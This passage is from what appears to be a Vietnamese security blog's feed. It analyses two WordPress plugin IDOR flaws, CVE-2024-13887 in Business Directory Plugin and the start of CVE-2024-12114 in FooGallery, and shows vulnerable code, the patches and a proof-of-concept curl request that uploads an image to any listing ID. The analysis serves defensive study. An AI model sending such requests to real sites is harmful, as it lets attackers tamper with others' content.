width=&#34;705&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Chọn plan&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Sau đó kiểm tra slot còn lại có thể upload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$slots_available = absint( $plan-&amp;gt;fee_images ) - absint( $_POST[&amp;#39;images_count&amp;#39;] );&#xA;if ( 0 &amp;gt;= $slots_available ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;Can not upload any more images for this listing.&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;} elseif ( $slots_available &amp;lt; count( $files ) ) {&#xA;    return $res-&amp;gt;send_error(&#xA;        sprintf(&#xA;            _nx(&#xA;                &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.&amp;#39;,&#xA;                &amp;#39;You\&amp;#39;re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.&amp;#39;,&#xA;                $slots_available,&#xA;                &amp;#39;listing image upload&amp;#39;,&#xA;                &amp;#39;business-directory-plugin&amp;#39;&#xA;            ),&#xA;            count( $files ),&#xA;            $slots_available&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/slot.png&#34; title=&#34;Slot&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/slot.png&#34; data-sub-html=&#34;&lt;h2&gt;Slot&lt;/h2&gt;&lt;p&gt;Slot&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/slot.png&#39; alt=&#34;Slot&#34; height=&#34;439&#34; width=&#34;509&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Slot&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nếu &lt;code&gt;slot &amp;lt;= 0&lt;/code&gt; thì trả về lỗi. Nếu không, duyệt qua các file và gọi đến &lt;code&gt;wpbdp_media_upload&lt;/code&gt; để upload file.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $files as $i =&amp;gt; $file ) {&#xA;    $image_error   = &amp;#39;&amp;#39;;&#xA;    $attachment_id = wpbdp_media_upload(&#xA;        $file,&#xA;        true,&#xA;        true,&#xA;        array(&#xA;            &amp;#39;image&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;min-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-min-filesize&amp;#39; ) ) * 1024,&#xA;            &amp;#39;max-size&amp;#39;   =&amp;gt; intval( wpbdp_get_option( &amp;#39;image-max-filesize&amp;#39; ) ) * 1024,&#xA;            &amp;#39;min-width&amp;#39;  =&amp;gt; wpbdp_get_option( &amp;#39;image-min-width&amp;#39; ),&#xA;            &amp;#39;min-height&amp;#39; =&amp;gt; wpbdp_get_option( &amp;#39;image-min-height&amp;#39; ),&#xA;        ),&#xA;        $image_error&#xA;    ); // TODO: handle errors.&#xA;&#xA;    if ( $image_error ) {&#xA;        $errors[ $file[&amp;#39;name&amp;#39;] ] = $image_error;&#xA;    } else {&#xA;        $attachments[] = $attachment_id;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cuối cùng hàm sẽ trả về thông tin upload dạng JSON.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;br&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;lỗ hổng xảy ra khi không có sự ràng buộc giữa &lt;code&gt;listing_id&lt;/code&gt; và người dùng được phép thực hiện upload, attacker có thể thực hiện upload images bất kì thông qua việc thay đổi tham số &lt;code&gt;listing_id&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Bản vá &lt;code&gt;v6.4.15&lt;/code&gt; đã triển khai một số biện pháp để khắc phục:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-31-cve-2024-13887/patch.png&#34; title=&#34;Bản vá&#34; data-thumbnail=&#34;/posts/2025-12-31-cve-2024-13887/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-31-cve-2024-13887/patch.png&#39; alt=&#34;Patch&#34; height=&#34;678&#34; width=&#34;1915&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Thực hiện kiểm tra nonce bằng &lt;code&gt;check_ajax_referer&lt;/code&gt; =&amp;gt; chống CSRF&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra owner của listing, nếu không phải sẽ trả về lỗi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wpbdp_user_is_admin() &amp;amp;&amp;amp; ! $listing-&amp;gt;owned_by_user( get_current_user_id() ) ) {&#xA;    return $res-&amp;gt;send_error( __( &amp;#39;You do not have permission to upload images to this listing&amp;#39;, &amp;#39;business-directory-plugin&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-admin/admin-ajax.php&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;action=wpbdp-listing-submit-image-upload&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;WordPress triggers ajax_listing_submit_image_upload()&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;No authentication required (wp_ajax_nopriv_)&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Extract listing_id from request&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Load listing object by ID&amp;#34;]&#xA;&#xA;G --&amp;gt; H{&amp;#34;Listing has fee plan?&amp;#34;}&#xA;&#xA;H -- No --&amp;gt; I[&amp;#34;Return error: select a plan&amp;#34;]&#xA;H -- Yes --&amp;gt; J[&amp;#34;Calculate remaining image slots&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;slots_available &amp;gt; 0?&amp;#34;}&#xA;&#xA;K -- No --&amp;gt; L[&amp;#34;Return error: no available slots&amp;#34;]&#xA;K -- Yes --&amp;gt; M[&amp;#34;Process uploaded files&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Call wpbdp_media_upload()&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;Attach uploaded image to listing&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Set thumbnail if needed&amp;#34;]&#xA;&#xA;P --&amp;gt; Q[&amp;#34;Return success response (JSON)&amp;#34;]&#xA;&#xA;Q --&amp;gt; R[&amp;#34;Image successfully attached to arbitrary listing&amp;#34;]&#xA;&#xA;R --&amp;gt; S[&amp;#34;IDOR: No ownership / permission validation&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST http://localhost/wp-admin/admin-ajax.php \&#xA;  -F &amp;#34;action=wpbdp-listing-submit-image-upload&amp;#34; \&#xA;  -F &amp;#34;listing_id=88&amp;#34; \&#xA;  -F &amp;#34;images=@/path/to/image.jpg&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng CVE-2024-13887 xuất phát từ việc endpoint &lt;code&gt;wpbdp-listing-submit-image-upload&lt;/code&gt; cho phép truy cập không cần xác thực và không kiểm tra quyền sở hữu &lt;code&gt;listing_id&lt;/code&gt;. Điều này cho phép attacker upload hình ảnh vào bất kỳ listing hợp lệ nào chỉ bằng cách thay đổi tham số đầu vào. Bản vá 6.4.15 đã khắc phục bằng cách bổ sung kiểm tra nonce và xác thực quyền sở hữu listing.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;IDOR xảy ra do thiếu kiểm tra quyền sở hữu tài nguyên.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv&lt;/code&gt; là điểm tấn công nguy hiểm nếu không có xác thực bổ sung.&lt;/li&gt;&#xA;&lt;li&gt;Không nên tin tưởng dữ liệu đầu vào như &lt;code&gt;listing_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Luôn kết hợp &lt;strong&gt;authentication + authorization&lt;/strong&gt; khi xử lý AJAX endpoint.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/business-directory-plugin/vulnerability/wordpress-business-directory-plugin-plugin-6-4-14-insecure-direct-object-reference-to-listing-arbitrary-image-addition-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Business Directory Plugin &amp;lt;= 6.4.14 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-12114 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-30-cve-2024-12114/</link>
      <pubDate>Tue, 30 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-30-cve-2024-12114/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;FooGallery – Responsive Photo Gallery, Image Viewer, Justified, Masonry &amp;amp; Carousel&lt;/strong&gt; dành cho &lt;strong&gt;WordPress&lt;/strong&gt; tồn tại lỗ hổng &lt;strong&gt;Insecure Direct Object Reference&lt;/strong&gt; trong &lt;strong&gt;tất cả các phiên bản đến và bao gồm 2.4.29&lt;/strong&gt; thông qua hành động AJAX &lt;strong&gt;&lt;code&gt;foogallery_attachment_modal_save&lt;/code&gt;&lt;/strong&gt;, do &lt;strong&gt;thiếu xác thực&lt;/strong&gt; đối với một khóa do người dùng kiểm soát (&lt;strong&gt;&lt;code&gt;img_id&lt;/code&gt;&lt;/strong&gt;).&lt;br&gt;&#xA;Điều này cho phép &lt;strong&gt;kẻ tấn công đã xác thực&lt;/strong&gt;, với &lt;strong&gt;quyền truy cập được cấp trở lên&lt;/strong&gt;, có thể &lt;strong&gt;cập nhật nội dung của bất kỳ bài viết hoặc trang nào&lt;/strong&gt;.&lt;br&gt;&#xA;Tác động thực sự chỉ xảy ra khi &lt;strong&gt;thiết lập vai trò Gallery Creator&lt;/strong&gt; được đặt ở mức &lt;strong&gt;thấp hơn “Editor”&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-12114&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-12114&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.4.29&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.30&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: N/A&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/foogallery/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FooGallery Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;FooGallery&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.29&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.4.30&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Theo mô tả cúa CVE, tác động thực sự chỉ xảy ra khi &lt;strong&gt;thiết lập vai trò Gallery Creator&lt;/strong&gt; được đặt ở mức &lt;strong&gt;thấp hơn “Editor”&lt;/strong&gt;.&#xA;Bạn có thể thiết lập nó ở đây:&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/role.png&#34; title=&#34;Gallery Creator role&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/role.png&#34; data-sub-html=&#34;&lt;h2&gt;Role&lt;/h2&gt;&lt;p&gt;Gallery Creator role&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/role.png&#39; alt=&#34;Role&#34; height=&#34;882&#34; width=&#34;1382&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gallery Creator role&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;Khi đó, user có vai trò này sẽ có thể dùng chức năng &lt;strong&gt;Add&lt;/strong&gt;/&lt;strong&gt;Edit&lt;/strong&gt; Gallery:&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create.png&#34; title=&#34;Create/Add&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/create.png&#34; data-sub-html=&#34;&lt;h2&gt;Create/Add&lt;/h2&gt;&lt;p&gt;Create/Add&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/create.png&#39; alt=&#34;Create/Add&#34; height=&#34;829&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create/Add&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký AJAX handler &lt;strong&gt;cho người dùng đã đăng nhập&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_foogallery_attachment_modal_save&amp;#39;, array( $this, &amp;#39;ajax_save_modal&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; là hook dành cho người dùng đã đăng nhập (Subcriber+). Khi có request tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=foogallery_attachment_modal_save&lt;/code&gt; thì callback &lt;code&gt;ajax_save_modal&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function ajax_save_modal() {&#xA;    $foogallery = ( isset( $_POST[&amp;#39;foogallery&amp;#39;] ) ? $_POST[&amp;#39;foogallery&amp;#39;] : array() );&#xA;&#xA;    if ( !is_array( $foogallery ) || empty( $foogallery ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    // Check for nonce security      &#xA;    if ( ! wp_verify_nonce( 